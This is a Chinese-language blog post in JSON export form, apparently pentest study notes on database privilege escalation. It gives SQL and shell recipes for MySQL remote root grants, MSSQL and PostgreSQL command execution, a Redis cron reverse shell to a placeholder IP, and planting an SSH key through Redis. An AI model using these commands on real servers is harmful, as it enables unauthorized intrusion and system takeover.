{"title":"权限提升-2","uid":"0f8abd92b0e73165bbd05c82bb1708c5","slug":"权限提升-2","date":"2025-06-01T09:03:06.779Z","updated":"2025-06-01T16:52:07.344Z","comments":true,"path":"api/articles/权限提升-2.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c41ba1b1-fb0a-4372-b48a-06427e3a6734.jpg","content":"<h1 id=\"权限提升-2\"><a href=\"#权限提升-2\" class=\"headerlink\" title=\"权限提升-2\"></a>权限提升-2</h1><h2 id=\"数据库提权\"><a href=\"#数据库提权\" class=\"headerlink\" title=\"数据库提权\"></a>数据库提权</h2><p>数据库提权流程：</p>\n<h3 id=\"1、先获取到数据库用户密码\"><a href=\"#1、先获取到数据库用户密码\" class=\"headerlink\" title=\"1、先获取到数据库用户密码\"></a>1、先获取到数据库用户密码</h3><ul>\n<li>网站存在SQL注入漏洞</li>\n<li>数据库的存储文件或备份文件</li>\n<li>网站应用源码中的数据库配置文件</li>\n<li>采用工具或脚本爆破(需解决外联问题)</li>\n</ul>\n<h3 id=\"2、利用数据库提权项目进行连接\"><a href=\"#2、利用数据库提权项目进行连接\" class=\"headerlink\" title=\"2、利用数据库提权项目进行连接\"></a>2、利用数据库提权项目进行连接</h3><p>工具提权：<br>MDUT<br>Databasetools<br>RequestTemplate<br><a href=\"https://github.com/SafeGroceryStore/MDUT\">https://github.com/SafeGroceryStore/MDUT</a><br><a href=\"https://github.com/Hel10-Web/Databasetools\">https://github.com/Hel10-Web/Databasetools</a><br><a href=\"https://github.com/1n7erface/RequestTemplate\">https://github.com/1n7erface/RequestTemplate</a></p>\n<h3 id=\"3、可利用建立代理解决不支持外联\"><a href=\"#3、可利用建立代理解决不支持外联\" class=\"headerlink\" title=\"3、可利用建立代理解决不支持外联\"></a>3、可利用建立代理解决不支持外联</h3><ul>\n<li>利用已知Web权限建立代理（等同于本地连接）</li>\n<li>利用已知权限执行SQL开启外联（让数据库支持外联）</li>\n</ul>\n<p><strong>mysql</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n<p><strong>mssql</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE;</span><br><span class=\"line\">EXEC sp_configure &#x27;Ad Hoc Distributed Queries&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE;</span><br></pre></td></tr></table></figure>\n<p><strong>oracle</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;</span><br><span class=\"line\">SHUTDOWN IMMEDIATE;</span><br><span class=\"line\">STARTUP;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、可利用数据库提权类型条件及技术\"><a href=\"#4、可利用数据库提权类型条件及技术\" class=\"headerlink\" title=\"4、可利用数据库提权类型条件及技术\"></a>4、可利用数据库提权类型条件及技术</h3><ul>\n<li><p>MYSQL：PHP+MYSQL 以web入口提权<br>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）<br>技术：UDF MOF 启动项 反弹Shell</p>\n</li>\n<li><p>MSSQL：.NET+MSSQL 以web入口提权<br>条件：sa密码<br>技术：xp_cmdshell sp_oacreate CLR 沙盒</p>\n</li>\n<li><p>Oracle:(站库分离，非JSP，直接数据库到系统等)<br>条件：数据库用户密码<br>技术：DBA。普通用户，注入模式</p>\n</li>\n<li><p>PostgreSQL<br>Web到系统<br>条件：数据库库用户密码<br>技术：CVE-2019-9193 UDF libc<br>提权原理：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP TABLE IF EXISTS cmd_exec;</span><br><span class=\"line\">CREATE TABLE cmd_exec(cmd_output test);</span><br><span class=\"line\">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class=\"line\">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Redis<br>数据库到linux<br>条件：利用未授权或密码连接后执行</p>\n</li>\n</ul>\n<p>1，定时任务反弹shell<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">set yy &quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\\n\\n\\n&quot;</span><br><span class=\"line\">config set dbfilename x</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p>注意：Centos会忽略乱码取执行格式正确的任务计划，而ubuntu并不会忽略这些代码，所有导致命令执行失败</p>\n<p>2，写入Linux ssh-key公钥<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态<br>允许使用密钥登录，即可以远程写入公钥，直接登录远程服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">cd /root/.ssh/</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;)</span><br><span class=\"line\">cat key.txt | redis-cli -h 目标IP -x set xxx</span><br></pre></td></tr></table></figure>\n<p>&#x2F;&#x2F;上述步骤在自己的攻击机器上执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Memcached<br>数据库到linux<br>条件：设置远程可访问或取得本地权限后访问</li>\n</ul>\n<p>是一套常用的key-value缓存系统，由于它本身没有权限控制模块，<br>服务被攻击者发现，通过命令交互可以直接读取memcached中的敏感信息。</p>\n","text":"权限提升-2数据库提权数据库提权流程： 1、先获取到数据库用户密码 网站存在SQL注入漏洞 数据库的存储文件或备份文件 网站应用源码中的数据库配置文件 采用工具...","permalink":"/post/权限提升-2","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2\"><span class=\"toc-text\">权限提升-2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">数据库提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%85%88%E8%8E%B7%E5%8F%96%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">1、先获取到数据库用户密码</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5\"><span class=\"toc-text\">2、利用数据库提权项目进行连接</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E5%8F%AF%E5%88%A9%E7%94%A8%E5%BB%BA%E7%AB%8B%E4%BB%A3%E7%90%86%E8%A7%A3%E5%86%B3%E4%B8%8D%E6%94%AF%E6%8C%81%E5%A4%96%E8%81%94\"><span class=\"toc-text\">3、可利用建立代理解决不支持外联</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E5%8F%AF%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E7%B1%BB%E5%9E%8B%E6%9D%A1%E4%BB%B6%E5%8F%8A%E6%8A%80%E6%9C%AF\"><span class=\"toc-text\">4、可利用数据库提权类型条件及技术</span></a></li></ol></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"权限提升-3-Win提权","uid":"297aecdf16f981e7362544429500ea6b","slug":"权限提升-3","date":"2025-06-02T11:03:21.960Z","updated":"2025-06-03T15:13:41.393Z","comments":true,"path":"api/articles/权限提升-3.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/b13a86ce-15ce-4233-941c-e8b1d7e55d8d.jpg","text":"权限提升-3Win提权服务启动sc是用于与服务控制管理器和服务进行通讯的命令行程序。使用版本:windows 7,10,08,12,16,19,22,早期用at...","permalink":"/post/权限提升-3","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"Win权限提升","slug":"Win权限提升","count":1,"path":"api/categories/Win权限提升.json"}],"tags":[{"name":"Win提升","slug":"Win提升","count":1,"path":"api/tags/Win提升.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"权限提升-1","uid":"6da41da59ea2ffb9c7c37f4ee7fbaf75","slug":"权限提升-1","date":"2025-05-31T12:11:29.139Z","updated":"2025-06-01T09:04:58.172Z","comments":true,"path":"api/articles/权限提升-1.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c160b854-1f3c-4901-9990-093288ad1c04.jpg","text":"权限提升-11、Web语言权限差异ASP/ASP.NET/PHP/JSP等权限高低：JSP>ASP.NET>ASP=PHP使用了java搭建的可以不需要提权，而...","permalink":"/post/权限提升-1","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/tags/权限提升.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}